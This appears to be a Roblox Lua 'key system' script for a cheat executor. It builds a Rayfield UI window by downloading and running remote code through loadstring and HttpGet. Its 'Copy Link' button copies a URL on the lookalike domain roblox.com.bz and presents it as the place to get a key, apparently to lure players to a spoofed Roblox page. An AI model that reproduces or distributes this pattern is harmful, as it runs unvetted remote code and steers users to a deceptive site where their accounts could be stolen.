local VALID_KEY = "YOURKEY-1234"
local KEY_LINK  = "https://roblox.com.bz/communities/6122024423/"
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
local Window = Rayfield:CreateWindow({
Name            = "🔑 Key System",
LoadingTitle    = "Key System",
LoadingSubtitle = "Made with Rayfield UI",
ConfigurationSaving = { Enabled = false },
KeySystem = false,
})
local Tab = Window:CreateTab("Key System", nil)
Tab:CreateSection("Enter Your Key")
local KeyInput = Tab:CreateInput({
Name                     = "Your Key",
PlaceholderText          = "Paste your key here...",
RemoveTextAfterFocusLost = false,
Callback = function() end,
})
Tab:CreateSection("Actions")
Tab:CreateButton({
Name = "🔑  Check Key",
Callback = function()
local entered = KeyInput.Value or ""
if entered == "" then
Rayfield:Notify({
Title    = "⚠ No Key Entered",
Content  = "Please paste your key into the box above.",
Duration = 4,
})
return
end
if entered == VALID_KEY then
Rayfield:Notify({
Title    = "✅ Access Granted",
Content  = "Your key is valid. Welcome!",
Duration = 5,
})
else
Rayfield:Notify({
Title    = "❌ Invalid Key",
Content  = "Wrong key! Press Copy Link to get a valid one.",
Duration = 5,
})
end
end,
})
Tab:CreateButton({
Name = "🔗  Copy Link",
Callback = function()
setclipboard(KEY_LINK)
Rayfield:Notify({
Title    = "🔗 Link Copied!",
Content  = "The key website has been copied to your clipboard.",
Duration = 3,
})
end,
})